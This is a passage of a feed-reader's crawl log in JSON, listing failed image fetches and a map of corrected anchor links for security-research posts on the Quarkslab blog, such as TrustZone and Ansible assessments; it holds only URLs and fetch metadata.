09:15:12","host":"us-023*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/off_soc.png","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":538,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:14","host":"us-031*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html/resources/2019-12-03-samsung_trustzone_exploitation_part1/off_soc.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11110,"totalSpendMs":188,"convertSpendMs":0,"createdTime":"2020-08-25 09:15:14","host":"europe65*","referer":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","linkMd5ListStr":"b2c23f95ebaba9ba1a3e978aafc827d9","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"}],"extra10_invalidATagHrefValue":{"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id14":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id14","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id15":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id15","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id16":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id16","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id17":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id17","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id18":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id18","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id19":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id19","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#pipsaleae":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#pipsaleae","http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html_#id7":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id7","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id10":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id10","http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html_#id8":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id8","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id11":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id11","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id12":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id12","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id13":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id13","http://blog.quarkslab.com/ansible-security-assessment.html_#id10":"http://blog.quarkslab.com/ansible-security-assessment.html#id10","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#sec-samsung-overview":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-overview","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#p71report":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p71report","http://blog.quarkslab.com/triton-v08-is-released.html_#id6":"http://blog.quarkslab.com/triton-v08-is-released.html#id6","http://blog.quarkslab.com/ansible-security-assessment.html_#id13":"http://blog.quarkslab.com/ansible-security-assessment.html#id13","http://blog.quarkslab.com/triton-v08-is-released.html_#id7":"http://blog.quarkslab.com/triton-v08-is-released.html#id7","http://blog.quarkslab.com/ansible-security-assessment.html_#id14":"http://blog.quarkslab.com/ansible-security-assessment.html#id14","http://blog.quarkslab.com/ansible-security-assessment.html_#id11":"http://blog.quarkslab.com/ansible-security-assessment.html#id11","http://blog.quarkslab.com/ansible-security-assessment.html_#id12":"http://blog.quarkslab.com/ansible-security-assessment.html#id12","http://blog.quarkslab.com/ansible-security-assessment.html_#id17":"http://blog.quarkslab.com/ansible-security-assessment.html#id17","http://blog.quarkslab.com/ansible-security-assessment.html_#id18":"http://blog.quarkslab.com/ansible-security-assessment.html#id18","http://blog.quarkslab.com/ansible-security-assessment.html_#id15":"http://blog.quarkslab.com/ansible-security-assessment.html#id15","http://blog.quarkslab.com/ansible-security-assessment.html_#id16":"http://blog.quarkslab.com/ansible-security-assessment.html#id16","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/sboot.bin":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/sboot.bin","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-10685":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10685","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#sammobile":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sammobile","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-10684":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10684","http://blog.quarkslab.com/ansible-security-assessment.html_#id19":"http://blog.quarkslab.com/ansible-security-assessment.html#id19","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id25":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id25","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id26":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id26","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id27":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id27","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id28":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id28","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id29":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id29","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#sec-kinibi-vuln-analysis":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sec-kinibi-vuln-analysis","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id9":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id9","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#checkpin":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#checkpin","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#trust-issues":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#trust-issues","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id20":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id20","http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html_#id13":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id13","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id21":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id21","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id6":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id6","http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html_#id12":"http://blog.quarkslab.com/reverse-engineering-a-philips-trimedia-cpu-based-ip-camera-part-3.html#id12","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id22":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id22","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id5":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id5","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#sec-samsung-kinibi":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-samsung-kinibi","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id23":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id23","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id8":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id8","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id24":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id24","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id7":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id7","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id2":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id2","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/trustlet.py":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/trustlet.py","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id1":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id1","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id4":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id4","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id3":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id3","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#sec-secure-drivers":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sec-secure-drivers","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#kernel-mishandling-of-mxcsr":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#kernel-mishandling-of-mxcsr","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id30":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id30","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id31":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id31","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id32":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id32","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id33":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id33","http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html_#id34":"http://blog.quarkslab.com/why-are-frida-and-qbdi-a-great-blend-on-android.html#id34","http://blog.quarkslab.com/ansible-security-assessment.html_#id31":"http://blog.quarkslab.com/ansible-security-assessment.html#id31","http://blog.quarkslab.com/ansible-security-assessment.html_#id32":"http://blog.quarkslab.com/ansible-security-assessment.html#id32","http://blog.quarkslab.com/ansible-security-assessment.html_#id30":"http://blog.quarkslab.com/ansible-security-assessment.html#id30","http://blog.quarkslab.com/ansible-security-assessment.html_#id35":"http://blog.quarkslab.com/ansible-security-assessment.html#id35","http://blog.quarkslab.com/ansible-security-assessment.html_#id36":"http://blog.quarkslab.com/ansible-security-assessment.html#id36","http://blog.quarkslab.com/ansible-security-assessment.html_#id33":"http://blog.quarkslab.com/ansible-security-assessment.html#id33","http://blog.quarkslab.com/ansible-security-assessment.html_#id34":"http://blog.quarkslab.com/ansible-security-assessment.html#id34","http://blog.quarkslab.com/ansible-security-assessment.html_#id39":"http://blog.quarkslab.com/ansible-security-assessment.html#id39","http://blog.quarkslab.com/ansible-security-assessment.html_#id37":"http://blog.quarkslab.com/ansible-security-assessment.html#id37","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#drm":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#drm","http://blog.quarkslab.com/ansible-security-assessment.html_#id38":"http://blog.quarkslab.com/ansible-security-assessment.html#id38","http://blog.quarkslab.com/phd-defense-of-jonathan-salwan-use-of-symbolic-execution-for-binary-deobfuscation.html_resources/2020-02-13-salwan-soutenance/salwan-thesis.pdf":"http://blog.quarkslab.com/resources/2020-02-13-salwan-soutenance/salwan-thesis.pdf","http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html_resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/rizzo.zip":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/rizzo.zip","http://blog.quarkslab.com/ansible-security-assessment.html_#id20":"http://blog.quarkslab.com/ansible-security-assessment.html#id20","http://blog.quarkslab.com/ansible-security-assessment.html_#id21":"http://blog.quarkslab.com/ansible-security-assessment.html#id21","http://blog.quarkslab.com/ansible-security-assessment.html_#id24":"http://blog.quarkslab.com/ansible-security-assessment.html#id24","http://blog.quarkslab.com/ansible-security-assessment.html_#id25":"http://blog.quarkslab.com/ansible-security-assessment.html#id25","http://blog.quarkslab.com/ansible-security-assessment.html_#id22":"http://blog.quarkslab.com/ansible-security-assessment.html#id22","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/fffffffff0000000000000000000001b.tlbin":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/fffffffff0000000000000000000001b.tlbin","http://blog.quarkslab.com/ansible-security-assessment.html_#id23":"http://blog.quarkslab.com/ansible-security-assessment.html#id23","http://blog.quarkslab.com/ansible-security-assessment.html_#id28":"http://blog.quarkslab.com/ansible-security-assessment.html#id28","http://blog.quarkslab.com/ansible-security-assessment.html_#id29":"http://blog.quarkslab.com/ansible-security-assessment.html#id29","http://blog.quarkslab.com/ansible-security-assessment.html_#id26":"http://blog.quarkslab.com/ansible-security-assessment.html#id26","http://blog.quarkslab.com/ansible-security-assessment.html_#id27":"http://blog.quarkslab.com/ansible-security-assessment.html#id27","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_a-deep-dive-into-samsungs-trustzone-part-1.html":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#handles":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#handles","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#sigrok":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sigrok","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#aes":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#aes","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#bh2019":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#bh2019","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#kernel-mishandling-of-iretq":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#kernel-mishandling-of-iretq","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#apdu":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#apdu","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id4":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id4","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id5":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id5","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id6":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id6","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id7":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id7","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id8":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id8","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id9":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id9","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#process-isolation":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#process-isolation","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html_a-deep-dive-into-samsungs-trustzone-part-1.html":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id1":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id1","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id2":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id2","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id3":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id3","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#p60sscd":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p60sscd","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id8":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id8","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id5":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id5","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id4":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id4","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html_#sboot":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html#sboot","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id7":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id7","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id6":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id6","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#sec-trustlet-exploitation":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sec-trustlet-exploitation","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id1":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id1","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#namespaces":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#namespaces","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id3":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id3","http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html_#id2":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id2","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#components":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#components","http://blog.quarkslab.com/ansible-security-assessment.html_#id3":"http://blog.quarkslab.com/ansible-security-assessment.html#id3","http://blog.quarkslab.com/ansible-security-assessment.html_#id2":"http://blog.quarkslab.com/ansible-security-assessment.html#id2","http://blog.quarkslab.com/ansible-security-assessment.html_#id1":"http://blog.quarkslab.com/ansible-security-assessment.html#id1","http://blog.quarkslab.com/ansible-security-assessment.html_#id7":"http://blog.quarkslab.com/ansible-security-assessment.html#id7","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#p71d321":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p71d321","http://blog.quarkslab.com/ansible-security-assessment.html_#id6":"http://blog.quarkslab.com/ansible-security-assessment.html#id6","http://blog.quarkslab.com/ansible-security-assessment.html_#id5":"http://blog.quarkslab.com/ansible-security-assessment.html#id5","http://blog.quarkslab.com/ansible-security-assessment.html_#id4":"http://blog.quarkslab.com/ansible-security-assessment.html#id4","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#jcop":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#jcop","http://blog.quarkslab.com/ansible-security-assessment.html_#id9":"http://blog.quarkslab.com/ansible-security-assessment.html#id9","http://blog.quarkslab.com/ansible-security-assessment.html_#id8":"http://blog.quarkslab.com/ansible-security-assessment.html#id8","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#sstic2020":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sstic2020","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#others":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#others","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#the-zircon-micro-kernel":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#the-zircon-micro-kernel","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#where-we-at":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#where-we-at","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_resources/2020-06-30-samsung_trustzone_exploitation-part3/ffffffffd00000000000000000000004.tlbin":"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/ffffffffd00000000000000000000004.tlbin","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id10":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id10","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id14":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id14","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id13":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id13","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id12":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id12","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id11":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id11","http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html_#attacking-fuchsia":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#attacking-fuchsia","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id10":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id10","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#id1":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id1","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#id2":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id2","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#id3":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id3","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#saleaesw":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#saleaesw","http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html_resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/extract_files.py":"http://blog.quarkslab.com/resources/2020-05-07_reverse_engineering_a_vxworks_os_based_router/code/extract_files.py","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#ownerpin":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#ownerpin","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_a-deep-dive-into-samsungs-trustzone-part-2.html":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#qbdi":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#qbdi","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id16":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id16","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#id15":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id15","http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html_#id5":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#id5","http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html_#sstic2018":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sstic2018","http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html_#vxworks-related-work":"http://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html#vxworks-related-work","http://blog.quarkslab.com/ansible-security-assessment.html_#cve-2020-1740":"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1740","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id1":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id1","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id2":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id2","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id3":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id3","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id4":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id4","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id5":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id5","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id6":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id6","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id7":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id7","http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html_#id8":"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-